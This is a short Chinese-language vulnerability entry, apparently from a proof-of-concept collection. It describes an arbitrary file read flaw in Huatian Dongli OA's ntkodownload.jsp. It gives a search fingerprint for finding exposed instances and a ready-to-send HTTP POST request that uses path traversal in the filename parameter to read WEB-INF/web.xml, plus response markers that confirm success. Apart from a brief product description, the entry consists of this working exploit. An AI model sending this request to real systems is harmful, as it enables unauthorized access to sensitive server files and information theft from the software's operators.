﻿# 华天动力OA ntkodownload.jsp 任意文件读取漏洞

> 更新时间：2024-02-06

> 漏洞编号：

> 漏洞说明：华天动力OA是一个以技术领先著称的协同软件产品，拥有领先业界的三大核心技术：协同平台、工作流和智能报表，是业内唯一实现协同工具软件、协同应用软件、协同平台融合的协同软件产品，也是业内唯一所有版本统一平台、统一服务、统一升级的协同软件产品。
华天动力OA ntkodownload.jsp接口处存在任意文件读取漏洞，恶意攻击者可能会利用此漏洞获取敏感信息，造成信息泄露

> 漏洞特征：app="华天动力-OA8000"

> 验证脚本：HTTP

```
POST /OAapp/jsp/trace/ntkodownload.jsp?filename=../../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

> 响应代码特征：200

> 响应内容特征：web-app

> 上传文件定位：


> 验证文件来源：华天动力OA ntkodownload.jsp 任意文件读取漏洞.poc
